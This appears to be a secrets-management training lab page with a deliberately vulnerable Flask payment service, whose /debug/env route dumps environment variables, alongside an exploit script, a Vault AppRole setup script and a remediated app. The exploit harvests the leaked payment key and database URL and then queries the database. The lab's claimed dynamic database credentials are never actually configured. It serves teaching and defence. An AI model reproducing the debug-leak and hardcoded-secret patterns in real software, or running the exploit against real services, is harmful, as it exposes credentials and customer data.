---
title: '06. Hands-On Lab: Hardcoded Secrets to Vault AppRole Remediation'
description: A self-contained runnable lab. Exploit a microservice with hardcoded
  secrets and environment variable leaks, then remediate it using HashiCorp Vault
  AppRole authentication and dynamic DB credentials.
keywords:
- hands-on
- lab
- vulnerability
- lab
- approle
- vault
- dev
- server
- docker
- compose
- python
- exploit
- secrets
- remediation
- appsec
sidebar_label: 06. Hands-On Lab
sidebar_position: 7
slug: /cloud-and-infra/secrets-management/hands-on-lab
---


# 06. Hands-On Lab: Hardcoded Secrets to Vault AppRole Remediation

In this self-contained lab, you will take on two roles:
1. **The Attacker**: Exploit a vulnerable Python Flask microservice that hardcodes payment API keys and exposes system environment variables via a debug endpoint.
2. **The Security Engineer**: Deploy a local HashiCorp Vault instance, configure AppRole machine authentication, and update the microservice to fetch credentials dynamically with short-lived leases.

---

## 1. Environment Architecture & Docker Setup

Create a working directory `secrets-lab/` containing the following setup files:

```
secrets-lab/
├── docker-compose.yml
├── setup-vault.sh
├── app_vulnerable.py
├── app_secure.py
├── exploit.py
└── requirements.txt
```

### File 1: `docker-compose.yml`

```yaml
version: '3.8'

services:
  postgres:
    image: postgres:15-alpine
    container_name: lab-postgres
    environment:
      POSTGRES_DB: payment_db
      POSTGRES_USER: postgres
      POSTGRES_PASSWORD: MasterPostgresPassword123!
    ports:
      - "5432:5432"
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U postgres"]
      interval: 5s
      timeout: 5s
      retries: 5

  vault:
    image: hashicorp/vault:1.15.2
    container_name: lab-vault
    ports:
      - "8200:8200"
    environment:
      VAULT_DEV_ROOT_TOKEN_ID: "root"
      VAULT_DEV_LISTEN_ADDRESS: "0.0.0.0:8200"
    cap_add:
      - IPC_LOCK

  vulnerable-app:
    build:
      context: .
      dockerfile: Dockerfile.app
    container_name: lab-vulnerable-app
    ports:
      - "5000:5000"
    environment:
      - PAYMENT_API_KEY=sk_live_998877665544332211
      - DATABASE_URL=postgresql://postgres:MasterPostgresPassword123!@postgres:5432/payment_db
    depends_on:
      postgres:
        condition: service_healthy
```

---

## 2. Part 1: The Vulnerable Application (`app_vulnerable.py`)

The application contains hardcoded payment gateway credentials and a `/debug/env` route that prints environment variables.

```python
# app_vulnerable.py
import os
import psycopg2
from flask import Flask, jsonify, request

app = Flask(__name__)

# BAD: Hardcoded Fallback Secret & Reading Unprotected Env Vars
HARDCODED_PAYMENT_KEY = "sk_live_998877665544332211"
DB_URL = os.getenv("DATABASE_URL", "postgresql://postgres:MasterPostgresPassword123!@localhost:5432/payment_db")

def get_db_connection():
    return psycopg2.connect(DB_URL)

@app.route('/api/v1/charge', methods=['POST'])
def process_charge():
    data = request.get_json()
    amount = data.get("amount", 0)
    
    # Process payment using hardcoded secret
    api_key = os.getenv("PAYMENT_API_KEY", HARDCODED_PAYMENT_KEY)
    
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("INSERT INTO transactions (amount, status) VALUES (%s, %s) RETURNING id;", (amount, "SUCCESS"))
    txn_id = cur.fetchone()[0]
    conn.commit()
    cur.close()
    conn.close()

    return jsonify({
        "status": "success",
        "transaction_id": txn_id,
        "charged_with_key": f"{api_key[:7]}..."
    })

# VULNERABILITY: Debug endpoint leaking environment variables
@app.route('/debug/env', methods=['GET'])
def debug_env():
    # CWE-532 / CWE-256: Exposing raw process environment
    return jsonify(dict(os.environ))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

---

## 3. Part 2: Exploitation Script (`exploit.py`)

Run this exploit script to extract the leaked database credentials and payment key, then exfiltrate data directly from the PostgreSQL database.

```python
# exploit.py
import requests
import psycopg2

TARGET_URL = "http://localhost:5000"

def run_exploit():
    print("[+] Step 1: Querying vulnerable /debug/env endpoint...")
    response = requests.get(f"{TARGET_URL}/debug/env")
    
    if response.status_code != 200:
        print("[-] Exploit failed: Debug endpoint unreachable.")
        return

    env_vars = response.json()
    db_url = env_vars.get("DATABASE_URL")
    api_key = env_vars.get("PAYMENT_API_KEY")

    print(f"[!] EXFILTRATED PAYMENT API KEY: {api_key}")
    print(f"[!] EXFILTRATED DATABASE URL:     {db_url}")

    print("[+] Step 2: Connecting directly to database using exfiltrated credentials...")
    try:
        conn = psycopg2.connect(db_url)
        cur = conn.cursor()
        cur.execute("SELECT table_name FROM information_schema.tables WHERE table_schema='public';")
        tables = cur.fetchall()
        print(f"[SUCCESS] Directly accessed database tables: {tables}")
        cur.close()
        conn.close()
    except Exception as e:
        print(f"[-] Database connection failed: {e}")

if __name__ == "__main__":
    run_exploit()
```

---

## 4. Part 3: Automated Vault Setup Script (`setup-vault.sh`)

Execute this script to configure Vault KV v2 and AppRole authentication:

```bash
#!/bin/bash
# setup-vault.sh
set -e

export VAULT_ADDR="http://localhost:8200"
export VAULT_TOKEN="root"

echo "[+] 1. Enabling KV v2 Secrets Engine..."
vault secrets enable -path=secret kv-v2 || true

echo "[+] 2. Storing Payment API Key in Vault..."
vault kv put secret/production/payment api_key="sk_live_SECURE_VAULT_GENERATED_KEY_999"

echo "[+] 3. Enabling AppRole Authentication..."
vault auth enable approle || true

echo "[+] 4. Creating Application Policy..."
vault policy write payment-app-policy - <<EOF
path "secret/data/production/payment" {
  capabilities = ["read"]
}
EOF

echo "[+] 5. Creating AppRole Role..."
vault write auth/approle/role/payment-app-role \
    secret_id_ttl=60m \
    token_ttl=1h \
    token_max_ttl=4h \
    policies="payment-app-policy"

echo "[+] 6. Generating RoleID and SecretID..."
ROLE_ID=$(vault read -field=role_id auth/approle/role/payment-app-role/role-id)
SECRET_ID=$(vault write -f -field=secret_id auth/approle/role/payment-app-role/secret-id)

echo "================================================="
echo " AppRole Credentials Generated Successfully!"
echo " VAULT_ROLE_ID:   $ROLE_ID"
echo " VAULT_SECRET_ID: $SECRET_ID"
echo "================================================="
```

---

## 5. Part 4: Remediated Application (`app_secure.py`)

The secure application removes all debug endpoints and authenticates to Vault via AppRole to fetch secrets dynamically.

```python
# app_secure.py
import os
import hvac
import psycopg2
from flask import Flask, jsonify, request

app = Flask(__name__)

VAULT_ADDR = os.getenv("VAULT_ADDR", "http://localhost:8200")
ROLE_ID = os.getenv("VAULT_ROLE_ID")
SECRET_ID = os.getenv("VAULT_SECRET_ID")
DB_URL = os.getenv("DATABASE_URL")

def get_vault_payment_key():
    if not ROLE_ID or not SECRET_ID:
        raise RuntimeError("VAULT_ROLE_ID and VAULT_SECRET_ID must be set.")

    client = hvac.Client(url=VAULT_ADDR)
    
    # AppRole Login
    client.auth.approle.login(role_id=ROLE_ID, secret_id=SECRET_ID)
    
    # Read Secret from KV v2
    secret = client.secrets.kv.v2.read_secret_version(
        path="production/payment",
        mount_point="secret"
    )
    return secret["data"]["data"]["api_key"]

@app.route('/api/v1/charge', methods=['POST'])
def process_charge():
    data = request.get_json()
    amount = data.get("amount", 0)
    
    # Dynamically fetch secret from Vault
    api_key = get_vault_payment_key()
    
    conn = psycopg2.connect(DB_URL)
    cur = conn.cursor()
    cur.execute("INSERT INTO transactions (amount, status) VALUES (%s, %s) RETURNING id;", (amount, "SUCCESS"))
    txn_id = cur.fetchone()[0]
    conn.commit()
    cur.close()
    conn.close()

    return jsonify({
        "status": "success",
        "transaction_id": txn_id,
        "charged_with_key": f"{api_key[:7]}..."
    })

# SECURE: Debug endpoint removed entirely!

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

---

## 6. Verification & Testing Instructions

1. **Start Environment**:
   ```bash
   docker-compose up -d
   ```
2. **Execute Exploit against Vulnerable Container**:
   ```bash
   python exploit.py
   ```
   *Expected Output*: Displays exfiltrated `PAYMENT_API_KEY` and lists PostgreSQL tables.

3. **Configure Vault AppRole**:
   ```bash
   chmod +x setup-vault.sh
   ./setup-vault.sh
   ```
4. **Deploy Secure App with AppRole Credentials**:
   ```bash
   export VAULT_ROLE_ID="<ROLE_ID_FROM_SETUP>"
   export VAULT_SECRET_ID="<SECRET_ID_FROM_SETUP>"
   python app_secure.py
   ```
5. **Re-run Exploit against Secure App**:
   ```bash
   python exploit.py
   ```
   *Expected Output*: Exploit fails with `404 Not Found` (debug route removed) and zero plaintext secrets exposed!

---

> [!NEXT]
> Move to **[Chapter 07: References & Standards](./07-references.md)** to review compliance frameworks, NIST standards, and official documentation links.
